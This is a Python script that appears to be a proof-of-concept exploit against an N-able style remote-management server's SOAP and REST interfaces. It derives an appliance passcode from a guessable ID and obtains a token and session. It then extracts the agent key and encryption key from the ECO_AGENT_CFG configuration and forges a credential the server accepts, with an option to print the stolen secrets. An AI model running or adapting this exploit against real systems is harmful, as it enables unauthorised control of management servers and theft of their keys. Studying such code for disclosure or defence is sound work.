#!/usr/bin/env python3
import argparse
import base64
import hashlib
import json
import re
import xml.etree.ElementTree as ET

import requests
import urllib3


SOAP = "http://www.w3.org/2003/05/soap-envelope"
MMS = "http://mms3.nobj.nable.com/"


def wrap(inner):
    return f'<soap:Envelope xmlns:soap="{SOAP}" xmlns:m="{MMS}"><soap:Body>{inner}</soap:Body></soap:Envelope>'


def returned(body, operation):
    return ET.fromstring(body).findtext(f'.//{{*}}{operation}Response/{{*}}return') or ""


def jwt_id(token):
    encoded = token.split(".")[1]
    encoded += "=" * (-len(encoded) % 4)
    return json.loads(base64.urlsafe_b64decode(encoded))["jti"]


def command_line(body):
    for item in ET.fromstring(body).iter():
        if item.tag.rsplit("}", 1)[-1] != "return":
            continue
        children = list(item)
        key = next((child.text or "" for child in children
                    if child.tag.rsplit("}", 1)[-1] == "Key1"), "")
        if key != "ECO_AGENT_CFG":
            continue
        for group in children:
            if group.tag.rsplit("}", 1)[-1] != "ComplexValues":
                continue
            row = {child.tag.rsplit("}", 1)[-1]: child.text or "" for child in group}
            if row.get("Key1") == "Executioner.1.commandLine":
                return row.get("Values", "")
    raise RuntimeError("ECO_AGENT_CFG command line was not returned")


def argument(command, name):
    match = re.search(r"/" + name + r"=([^\s]+)", command, re.I)
    if not match:
        raise RuntimeError(f"/{name} is missing")
    return match.group(1).strip("\"'")


def encrypted_string(agent_key, encryption_key):
    material = agent_key.lower() + "_" + encryption_key.lower()
    password_hash = base64.b64encode(hashlib.sha256(material.encode()).digest()).decode()
    return base64.b64encode((agent_key + ":" + password_hash).encode()).decode()


def error_code(response):
    try:
        value = response.json()
        for row in value if isinstance(value, list) else [value]:
            for prop in row.get("dataProperties", []):
                if prop.get("name") == "messageErrorCode":
                    return str(prop.get("value"))
    except Exception:
        pass
    return ""


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://192.168.1.14")
    parser.add_argument("--appliance-id", type=int, required=True)
    parser.add_argument("--hardware-id", default="operator-ecosystem-client")
    parser.add_argument("--source-ip", default="192.168.1.145")
    parser.add_argument("--show-secrets", action="store_true")
    args = parser.parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    origin = args.target.rstrip("/")
    endpoint = origin + "/dms2/services2/ServerMMS3"
    http = requests.Session()
    http.verify = False
    http.headers.update({"Content-Type": "application/soap+xml; charset=UTF-8",
                         "X-Forwarded-For": args.source_ip})

    def post(inner, token=None, sid=None):
        headers = {}
        if token:
            headers["Authorization"] = "Bearer " + token
        if sid:
            headers["X-Session-Id"] = str(sid)
        return http.post(endpoint, data=wrap(inner), headers=headers, timeout=45)

    passcode = hashlib.sha256(str(args.appliance_id).encode()).hexdigest()
    acquired = post(f'<m:AcquireToken><m:applianceId>{args.appliance_id}</m:applianceId>'
                    f'<m:passcode>{passcode}</m:passcode>'
                    f'<m:hardwareId>{args.hardware_id}</m:hardwareId></m:AcquireToken>')
    acquired.raise_for_status()
    token = returned(acquired.content, "AcquireToken")
    post(f'<m:ConfirmTokenReceived><m:jwtId>{jwt_id(token)}</m:jwtId></m:ConfirmTokenReceived>').raise_for_status()
    hello = post('<m:SessionHello><m:version>2.0.0</m:version>'
                 '<m:applianceVersion>1.0.0.0</m:applianceVersion>'
                 '<m:agent_OSID>winnt</m:agent_OSID><m:agent_OS>Windows</m:agent_OS>'
                 '<m:timeZoneID>-05:00</m:timeZoneID></m:SessionHello>', token)
    hello.raise_for_status()
    sid = returned(hello.content, "SessionHello")
    try:
        config = post('<m:ApplianceGetConfig><m:configTypes>ECO_AGENT_CFG</m:configTypes>'
                      '</m:ApplianceGetConfig>', token, sid)
        config.raise_for_status()
        command = command_line(config.content)
        agent_key = argument(command, "agentkey")
        encryption_key = argument(command, "enckey")
        credential = encrypted_string(agent_key, encryption_key)
        body = {"dataProperties": [{"name": "integrationId", "value": "ECO_AGENT_CFG"}]}
        url = origin + ":8443/dms/rest/ecosystem-shim/ecosystem-agent-validate-connection"
        invalid = requests.post(url, json=body, headers={"EncryptedString": base64.b64encode(b"invalid:invalid").decode()},
                                verify=False, timeout=30)
        valid = requests.post(url, json=body, headers={"EncryptedString": credential},
                              verify=False, timeout=30)
        if args.show_secrets:
            print(f"agentKey={agent_key}")
            print(f"encKey={encryption_key}")
        else:
            print(f"agentKey_present={bool(agent_key)}")
            print(f"encKey_present={bool(encryption_key)}")
        print(f"invalid_error_code={error_code(invalid)}")
        print(f"derived_error_code={error_code(valid)}")
        return 0 if error_code(invalid) == "403 FORBIDDEN" and error_code(valid) == "0" else 1
    finally:
        post('<m:SessionQuit><m:shutdown>false</m:shutdown></m:SessionQuit>', token, sid)


if __name__ == "__main__":
    raise SystemExit(main())
